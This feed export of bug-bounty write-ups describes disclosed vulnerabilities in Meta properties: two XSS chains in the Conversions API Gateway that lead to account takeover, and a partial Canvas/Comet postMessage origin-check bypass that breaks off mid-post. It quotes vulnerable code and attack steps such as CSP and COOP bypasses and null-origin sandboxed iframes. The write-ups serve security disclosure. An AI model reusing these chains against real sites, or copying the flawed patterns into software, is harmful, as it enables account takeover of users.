Dec 18, 2024 — Bug reported</p>

<p>Dec 19, 2024 — Bug Acknowledged by Facebook</p>

<p>Jan 15, 2025 — <strong>$24,000</strong> bounty awarded by Meta</p>

<p>Jan 27, 2025 — Bug Fixed by Facebook</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook relies on long-lived device identifiers to reduce friction for returning users and to distinguish legitimate activity from suspicious logins. Over time, devices that repeatedly authenticate to the same account are treated as trusted, allowing Facebook to relax certain security requirements during sensitive flows such as account recovery.]]></summary></entry><entry><title type="html">Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover</title><link href="http://localhost:4000/uncategorized/2026/01/13/capig-xss.html" rel="alternate" type="text/html" title="Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover" /><published>2026-01-13T14:04:43+02:00</published><updated>2026-01-13T14:04:43+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/13/capig-xss</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/13/capig-xss.html"><![CDATA[<h2 id="introduction">Introduction</h2>

<p>The Meta Conversions API Gateway is a server-side solution developed by Meta (formerly Facebook) that allows businesses to send web events, such as customer interactions and purchase data, directly from their servers to Meta’s platforms, bypassing traditional browser-based tracking methods like the Facebook Pixel.</p>

<p>This gateway acts as an intermediary that collects, processes, and securely transmits event data from your website or app to Meta. Unlike client-side tracking, which relies on cookies and browser signals, the Conversions API Gateway ensures that the data reaches Meta even if a user has disabled cookies, uses ad blockers, or is affected by browser privacy restrictions. It can be deployed using cloud servers or via Meta’s own infrastructure, allowing for streamlined integration with minimal technical overhead.</p>

<p>Technically, the Meta Conversions API Gateway is open-source technology, which means that any company can deploy it within their own infrastructure rather than relying solely on Meta’s servers. Meta provides the gateway as a containerized application, making it compatible with common cloud platforms or on-premises servers. This setup allows businesses to maintain full control over the data flow, security, and compliance while still sending conversion events to Meta. The gateway is designed to handle high volumes of server-to-server event traffic efficiently.</p>

<h3 id="the-conversions-api-gateway-gwconversionsapigatewaycom-and-capig-eventsjs-script">The Conversions API Gateway gw.conversionsapigateway.com and capig-events.js script</h3>

<p>The Conversions API Gateway (<code class="language-plaintext highlighter-rouge">gw.conversionsapigateway.com</code>) is Meta’s own hosted deployment of the gateway application. We decided to test against Meta’s gateway directly, since any vulnerability would affect Meta-owned properties immediately.</p>

<p>To support conversion event collection and processing, the gateway serves a JavaScript file named <code class="language-plaintext highlighter-rouge">capig-events.js</code>, located at:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gw.conversionsapigateway.com/sdk/&lt;pixel_id&gt;/capig-events.js
</code></pre></div></div>

<p>Within Meta’s infrastructure, this script is not manually embedded by developers. Instead, it is automatically loaded by Meta’s <code class="language-plaintext highlighter-rouge">fbq</code> client-side JavaScript module. As a result, it executes on:</p>

<ul>
  <li>www.meta.com</li>
  <li>business.facebook.com</li>
  <li>developers.facebook.com</li>
  <li>Various third-party customer websites</li>
</ul>

<p>Any vulnerability in this script therefore inherits the privilege of whatever site includes it.</p>

<hr />

<h2 id="bug-1-trusting-eventorigin-and-turning-it-into-a-script-loader">Bug #1: Trusting event.origin and Turning It Into a Script Loader</h2>

<p>The first issue exists entirely on the client side, inside <code class="language-plaintext highlighter-rouge">capig-events.js</code>. It only triggers under a specific condition: when the page has an opener window.</p>

<p>If <code class="language-plaintext highlighter-rouge">window.opener</code> is present, the script registers a <code class="language-plaintext highlighter-rouge">message</code> event listener to receive configuration data for IWL.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>

    <span class="k">if </span><span class="p">(</span>
        <span class="o">!</span><span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">AHP_IWL_CONFIG_STORAGE_KEY</span><span class="dl">"</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
        <span class="o">!</span><span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">FACEBOOK_IWL_CONFIG_STORAGE_KEY</span><span class="dl">"</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
        <span class="nx">data</span><span class="p">.</span><span class="nx">msg_type</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">IWL_BOOTSTRAP</span><span class="dl">"</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nf">checkInList</span><span class="p">(</span><span class="nx">g</span><span class="p">.</span><span class="nx">pixels</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pixel_id</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">localStorage</span><span class="p">.</span><span class="nf">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">AHP_IWL_CONFIG_STORAGE_KEY</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">pixelID</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pixel_id</span><span class="p">,</span>
                <span class="na">host</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">origin</span><span class="p">,</span>
                <span class="na">sessionStartTime</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">session_start_time</span>
            <span class="p">});</span>
            <span class="nf">startIWL</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This is where the first trust boundary is crossed.</p>

<p>When a message with type <code class="language-plaintext highlighter-rouge">IWL_BOOTSTRAP</code> is received, the script checks that the provided <code class="language-plaintext highlighter-rouge">pixel_id</code> exists in an internal list. What it does <strong>not</strong> check is where the message came from.</p>

<p>Instead of validating <code class="language-plaintext highlighter-rouge">event.origin</code> against an allowlist, the script stores it and treats it as a trusted host.</p>

<p>Later, during initialization, this stored origin is used to dynamically load another JavaScript file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;origin&gt;/sdk/&lt;pixel_id&gt;/iwl.js
</code></pre></div></div>

<p>At this point, the vulnerability becomes clear.
The attacker cannot control the path, but they fully control the origin. If they can make the browser accept a script from that origin, they gain arbitrary JavaScript execution in the context of the embedding site.</p>

<p>This is a classic example of a dangerous pattern:<br />
<strong>taking unvalidated origin data from <code class="language-plaintext highlighter-rouge">postMessage</code> and turning it into code execution</strong>.</p>

<hr />

<h3 id="why-this-is-not-immediately-trivial-csp-and-coop">Why This Is Not Immediately Trivial? CSP and COOP</h3>

<p>On paper, Content Security Policy (CSP) and Cross-Origin-Opener-Policy (COOP) appear to limit the impact.</p>

<p>On <code class="language-plaintext highlighter-rouge">www.meta.com</code>, CSP does not allow arbitrary external scripts.<br />
Additionally, most pages deploy:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">Cross-Origin-Opener-Policy: same-origin-allow-popups
</span></code></pre></div></div>

<p>This prevents simple opener-based exploitation.</p>

<p>However, security is not evaluated on a single page or a single policy.<br />
It is evaluated across <em>all</em> contexts where the code runs.</p>

<hr />

<h4 id="csp-bypass">CSP Bypass</h4>

<p>In logged-out states, certain Meta pages (notably under <code class="language-plaintext highlighter-rouge">/help/</code>) relax CSP to include third-party analytics providers such as:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">*.THIRD-PARTY.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">*.THIRD-PARTY.net</code></li>
</ul>

<p>At that point, the attack surface expands.<br />
A subdomain takeover, XSS, or file upload on any CSP-allowed third-party domain would be sufficient to host an attacker script capable of sending the required message to trigger the exploit.</p>

<hr />

<h4 id="cross-origin-opener-policy-same-origin-allow-popups-bypass">Cross-Origin-Opener-Policy: same-origin-allow-popups Bypass</h4>

<p>When executed inside Facebook’s Android WebView, <code class="language-plaintext highlighter-rouge">window.name</code> reuse combined with <code class="language-plaintext highlighter-rouge">window.open()</code> allowed attacker-controlled pages to regain access to the opener.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>This bypass only ensured that the current window would have an <strong>opener</strong> object; however, the window becomes its own opener.<br />
In this case, the cross-window message must be sent from one of the page’s iframes.</p>

<hr />

<h4 id="iframe-hijacking">Iframe Hijacking</h4>

<p>Likely, <code class="language-plaintext highlighter-rouge">meta.com</code> was loading third-party content such as ads or social plugins hosted in iframes.<br />
We exploited a vulnerability in one of these third-party components to completely hijack the iframe and later send the malicious <code class="language-plaintext highlighter-rouge">postMessage</code> from there.</p>

<p>This allowed the attacker-controlled iframe to interact with the parent window (<code class="language-plaintext highlighter-rouge">www.meta.com</code>) and deliver a malicious <code class="language-plaintext highlighter-rouge">postMessage</code> payload, which eventually triggered the loading of the JavaScript file <code class="language-plaintext highlighter-rouge">iwl.js</code> from a CSP-allowed third-party website.</p>

<h2 id="attack-flow-summary">Attack Flow Summary</h2>

<p>First, we visit the attacker’s website while logged into Facebook, inside the Facebook App WebView:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0) User opens a url inside Facebook application

1) The script running on the attacker’s website executes the opener bypass
   and redirects the user to https://www.meta.com/help/

2) On the help page, the script inside the hijacked iframe redirects to a
   (*.THIRD-PARTY.com) page (allowed by Meta’s CSP). The script there sends the
   IWL_BOOTSTRAP postMessage to the parent window (www.meta.com)

3) At the same time, the attacker-controlled (*.THIRD-PARTY.com) hosts a
   JavaScript file named iwl.js under /sdk/{pixel_id}/iwl.js containing
   the XSS payload

4) The script is loaded from the attacker-controlled third-party website
   and executed in the context of www.meta.com
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>Since this occurs in a logged-out state on <code class="language-plaintext highlighter-rouge">www.meta.com</code> and inside the Facebook App WebView, the objective is to escalate this into <strong>Facebook account takeover</strong>.</p>

<p>We identified an endpoint on <code class="language-plaintext highlighter-rouge">www.facebook.com</code> that whitelists <code class="language-plaintext highlighter-rouge">www.meta.com</code> in CORS.<br />
From there, it becomes possible to issue authenticated requests, read CSRF tokens from responses, and perform privileged actions such as changing the account’s email or phone number—ultimately leading to full account takeover.</p>

<hr />

<h2 id="bug-2-stored-javascript-injection-in-the-gateway-backend">Bug #2: Stored JavaScript Injection in the Gateway Backend</h2>

<p>The second vulnerability exists on the server side and is arguably more severe.</p>

<p>After reporting the first bug, I went to take a look at the code. It then came to my attention what the <code class="language-plaintext highlighter-rouge">iwl.js</code> JavaScript file that this code attempts to load actually does.</p>

<p>If the file is successfully loaded from <code class="language-plaintext highlighter-rouge">https://gw.conversionsapigateway.com</code>,<br />
the <code class="language-plaintext highlighter-rouge">www.meta.com</code> website displays a graphical tool that looks like this:</p>

<p><img src="/assets/uploads/2025/01/ui.png" alt="capig-iwl-ui" /></p>

<p>While experimenting with the tool, I noticed that it allows creating IWL event rules and parameters.<br />
Whenever a new event match rule is added, the tool triggers a POST request.</p>

<p>For example, when a rule is created to match the load event of a page named <code class="language-plaintext highlighter-rouge">testing_page</code>, the request returns a <strong>200 OK</strong> status code along with a response body containing the ID of the newly created rule. The same behavior occurs for POST requests used to add other IWL rules.</p>

<p><img src="/assets/uploads/2025/01/postrequest.png" alt="capig-iwl-post" /></p>

<p>After adding the rules, nothing appeared to happen, at least initially.</p>

<p>At this point, I decided to review the source code, which was publicly available on Amazon ECR.<br />
After downloading it, I found hundreds of libraries packaged as JAR files. To make the code easier to inspect, I extracted all of them and began searching for keywords from the earlier requests.</p>

<p>That’s when I discovered that the logic responsible for generating parts of <code class="language-plaintext highlighter-rouge">capig-events.js</code> resides in:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Lib: pipeline-sources-common-1.0.0-SNAPSHOT.jar</code></li>
  <li><code class="language-plaintext highlighter-rouge">AHPixelIWLParametersPlugin.java</code></li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">StringsKt</span><span class="o">.</span><span class="na">trimIndent</span><span class="o">(</span><span class="s">"\n cbq.loadPlugin(\"ESTRuleEvaluator\");cbq.optIn(\""</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">pixelID</span> <span class="o">+</span> <span class="s">"\", \"ESTRuleEvaluator\");\n "</span><span class="o">));</span>

<span class="nc">StringsKt</span><span class="o">.</span><span class="na">trimIndent</span><span class="o">(</span><span class="s">"\n cbq.config.set(\""</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">pixelID</span> <span class="o">+</span> <span class="s">"\",\"IWLParameters\",{params: "</span> <span class="o">+</span> <span class="n">paramsCommand</span> <span class="o">+</span> <span class="s">"});\n "</span><span class="o">);</span>
<span class="k">return</span> <span class="n">extractorCommand</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(</span><span class="n">extractorConfig</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
<span class="nc">String</span> <span class="n">extractorConfigSerilized</span> <span class="o">=</span> <span class="n">serilizeExtractorConfig</span><span class="o">(</span><span class="n">extractorConfig</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"{\"domain_uri\":\""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">domainUrl</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"event_type\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">eventType</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"extractor_config\": "</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">extractorConfigSerilized</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">",\"extractor_type\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">extractorType</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"id\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",},"</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Essentially, the code takes JSON keys supplied in the request and constructs a JavaScript string by appending corresponding values.</p>

<p>The calls to <code class="language-plaintext highlighter-rouge">cbq.loadPlugin</code> and <code class="language-plaintext highlighter-rouge">cbq.config.set</code> were familiar — the same functions are used extensively throughout Meta Pixel and Signals JavaScript files. This raised suspicion that the generated output would eventually be appended to the initial <code class="language-plaintext highlighter-rouge">capig-events.js</code> script.</p>

<p>Revisiting <code class="language-plaintext highlighter-rouge">capig-events.js</code> confirmed this. At the end of the file, the dynamically appended code was present:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cbq</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">1701366827799</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IWLParameters</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">params</span><span class="p">:</span> <span class="p">{</span>
        <span class="dl">"</span><span class="s2">domain_uri</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://www.meta.com</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">event_type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AddToCart</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">extractor_config</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">...</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">extractor_type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CSS</span><span class="dl">"</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This confirmed that the script is <strong>not static</strong>, but dynamically changes depending on which rules or plugins are configured.</p>

<hr />

<p>Returning to the backend code, a major issue becomes obvious, it concatenates strings using <strong>user-controlled values</strong> without any escaping.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span><span class="n">extractorConfig</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
<span class="nc">String</span> <span class="n">extractorConfigSerilized</span> <span class="o">=</span> <span class="n">serilizeExtractorConfig</span><span class="o">(</span><span class="n">extractorConfig</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"{\"domain_uri\":\""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">domainUrl</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"event_type\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">eventType</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"extractor_config\": "</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">extractorConfigSerilized</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">",\"extractor_type\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">extractorType</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",\"id\": \""</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
<span class="n">paramsCommand</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\",},"</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Essentially, the code takes JSON keys supplied in the request and constructs a JavaScript string by appending corresponding values.</p>

<p>Exploitation is trivial — injecting a single quote is sufficient to break out of the string context and begin injecting arbitrary JavaScript. By injecting characters such as <code class="language-plaintext highlighter-rouge">"]}</code>, attacker-controlled JavaScript is appended to the generated output. The result is a <strong>stored XSS</strong> vulnerability inside <code class="language-plaintext highlighter-rouge">capig-events.js</code> itself.Once injected, the payload is served to <strong>every user</strong> who loads the script — including visitors to Meta-owned domains.</p>

<p><img src="/assets/uploads/2025/01/poc.png" alt="capig-iwl-poc" /></p>

<hr />

<h2 id="why-this-matters-more-than-a-typical-xss">Why This Matters More Than a Typical XSS</h2>

<p>This is not a single-page issue. It is a <strong>supply-chain vulnerability</strong> in a shared analytics tool. Attackers does not need to trick users into clicking links. They can cause JavaScript execution:</p>

<ul>
  <li>On <code class="language-plaintext highlighter-rouge">www.meta.com</code>, <code class="language-plaintext highlighter-rouge">www.facebook.com</code>, <code class="language-plaintext highlighter-rouge">business.facebook.com</code>, and internal Meta domains</li>
  <li>Inside authenticated browser sessions</li>
  <li>At massive scale</li>
</ul>

<p>Once code execution is achieved on a Meta surface, further escalation becomes possible — including interaction with Facebook endpoints, account takeover, and even remote code execution if employees in internal Meta domains were targeted.</p>

<p>Even without immediate ATO, the silent execution of attacker-controlled JavaScript in a globally deployed analytics script is already catastrophic.</p>

<h2 id="beyond-meta">Beyond Meta</h2>

<p>Because the Conversions API Gateway is open source, any company deploying it and loading <code class="language-plaintext highlighter-rouge">capig-events.js</code> from their own gateway may also be vulnerable.</p>

<p>Our research indicates that the application has been deployed <strong>at least 100 million times</strong>.<br />
Organizations hosting the script on their own domains are therefore exposed to the same stored XSS vulnerability</p>

<p>In practical terms, this meant that within hours, any Facebook user ( or any other user ) visiting virtually any page on the internet ( that includes this script ) could have been silently targeted. Because the vulnerable code executed in trusted Facebook and third‑party contexts, an attacker could have compromised millions of users in a very short time frame, without interaction or warning.</p>

<p><img src="/assets/uploads/2025/01/deployments.png" alt="conversions-api-gateway-deployments" /></p>

<h2 id="closing-thoughts">Closing Thoughts</h2>

<p>Both vulnerabilities described here stem from the same root problem: treating analytics infrastructure as “low risk” code.</p>

<p>When JavaScript is shared across products, domains, and customers, it becomes part of the platform’s <strong>trusted computing base</strong>.</p>

<p>At that point, origin validation, strict CSP design, and safe code generation are no longer optional, they are existential requirements.</p>

<p>The Conversions API Gateway demonstrates how small, localized trust decisions can cascade into platform-wide security failures.</p>

<h2 id="timeline">Timeline</h2>

<p>Nov 22, 2024 — Bug #2 reported</p>

<p>Nov 22, 2024 — Bug #2 Acknowledged by Facebook</p>

<p>Nov 24, 2024 — Bug #1 reported</p>

<p>Nov 25, 2024 — Bug #1 Acknowledged by Facebook</p>

<p>Dec 11, 2024 — Bug #1 Fixed by Facebook</p>

<p>Dec 24, 2024 — <strong>$62,500</strong> bounty awarded by Meta for Bug #1</p>

<p>Jan 3, 2025 — Bug #2 Fixed by Facebook</p>

<p>Jan 16, 2025 — <strong>$250,000</strong> bounty awarded by Meta for Bug #2</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">Account Takeover in Canvas Apps served in Comet due to failure in Cross-Window-Message Origin validation</title><link href="http://localhost:4000/uncategorized/2023/01/29/account-takeover-in-canvas-apps-served-in-comet-due-to-failure-in-cross-window-message-origin-validation.html" rel="alternate" type="text/html" title="Account Takeover in Canvas Apps served in Comet due to failure in Cross-Window-Message Origin validation" /><published>2023-01-29T14:04:55+02:00</published><updated>2023-01-29T14:04:55+02:00</updated><id>http://localhost:4000/uncategorized/2023/01/29/account-takeover-in-canvas-apps-served-in-comet-due-to-failure-in-cross-window-message-origin-validation</id><content type="html" xml:base="http://localhost:4000/uncategorized/2023/01/29/account-takeover-in-canvas-apps-served-in-comet-due-to-failure-in-cross-window-message-origin-validation.html"><![CDATA[<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
<p style="font-size:30px">
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This bug could allow a malicious actor to takeover Facebook/Meta accounts if the user decided to play a Canvas game. <!--more--> <br><br>The new <strong>Canvas on Comet</strong> is using <strong>Compat</strong> to display dialogs( eg OAuth dialogs ) in separate iframes, the process of displaying a dialog is to first receive a message of the type of the dialog ( like oauth ) and then create an iframe hosting <a href="https://apps.facebook.com/compat">apps.facebook.com/compat</a>, then that iframe would communicate with the parent window via cross window messaging and then try to setup a new communication channel by sending a new MessageChannel port ( <strong>CometCompatBroker</strong> handles that in the parent window )</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Once the new channel is established, the parent window would send the dialog uri to the iframe (  like <strong><a href="https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com">https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com</a></strong> ) and then the iframe would make an async request and display the response which should be a dialog.<br>The step of establishing a new communication channel by sharing a MessageChannel Port is crucial since there are no more checks done to messages coming through that MessageChannel and the source is considered trusted. Before using the new communication channel, multiple checks are done to the source or sender of the message ( containing the MessageChannel port ) , CometCompatBroker verifies the origin of the message: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CometCompatBroker : setupMessageChannel function:</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="javascript" class="language-javascript">var d = c("getMessageEventString")(a, "compatAction")
, e = c("getMessageEventString")(a, "iframeKey");
(this.$CometCompatBroker5 &amp;&amp; i(a.origin) || h(a.origin)) &amp;&amp; d === "CompatSetup" &amp;&amp; e === this.$CometCompatBroker2 &amp;&amp; (this.$CometCompatBroker1 &amp;&amp; this.$CometCompatBroker1.close(),
a.ports != null &amp;&amp; Array.isArray(a.ports) &amp;&amp; (this.$CometCompatBroker1 = a.ports[0],
this.$CometCompatBroker1.onmessage = this.$CometCompatBroker6,
b()))</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>The interesting verification part is: h(a.origin)) &amp;&amp; d === "CompatSetup" &amp;&amp; e === this.$CometCompatBroker2 . So it has two checks, it would verify if iframeKey matches "e" and if the origin is allowed by passing it to function "h"; the first verification could be bypassed by bruteforcing because iframeKey has a unique format js_c_XX where XX can be in the charset [a-z0-9].</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>function h has this code:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="javascript" class="language-javascript">var b = d("ConstUriUtils").getUri(a);
if (b == null) {
c("FBLogger")("comet_infra").mustfix("Failed to parse the origin `%s`", a);
return !1
}
a = ["apps", "secure", "www"].some(function(a) {
a = d("ConstUriUtils").getUri(c("getCompatIframeOrigin")(a));
return a == null ? !1 : b.isSameOrigin(a)
});
if (a)
return !0;
a = d("ConstUriUtils").getUri(document.location.origin.replace(/facebook\.com/i, "messenger.com"));
return a ? b.isSameOrigin(a) : !1</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>Here it creates a new URI object in b, then try to verify the domain. The bypass would be to send the message from a sandboxed iframe which would have the origin set to "null" in that case, <strong>d("ConstUriUtils").getUri(a)</strong> would return an URI object where protocol, domain , port all equal to null. The check to see if the origin is allowed is done via b.isSameOrigin(a) ; that function has this code:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="javascript" class="language-javascript">if (this.getProtocol() &amp;&amp; this.getProtocol() !== a.getProtocol())
return !1;
if (this.getDomain() &amp;&amp; this.getDomain() !== a.getDomain())
return !1;
if (this.getPort() &amp;&amp; this.getPort() !== a.getPort())
return !1;
return this.toString() === "" || a.toString() === "" ? !1 : !0</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p><br>Since b, as we mentioned, has protocol, domain and port undefined, all checks would pass and the final one (this.toString() ) would return "null" and not "". <strong>The correct way to use this function is to check if the trusted domain isSameOrigin with the untrusted one : ( a.isSameOrigin(b) instead of b.isSameOrigin(a) )</strong> .</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Now since the origin check was bypassed and the MessageChannel port sent is being used, we would send this message to the port , {compatAction:"request-loaddialog"} ; the parent window would send back the dialog-url mentioned before , ( check <strong>CometCompatModalUniversal.react</strong> , j.sendChildFrameParams({ compatAction: "loaddialog", rel: a.params.rel, uri: a.params.uri }) modules for more details) .</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The dialog url like <strong><strong><a href="https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com">https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com</a></strong></strong> would leak the cquick_token and the state. Now comes the best part! : </p>
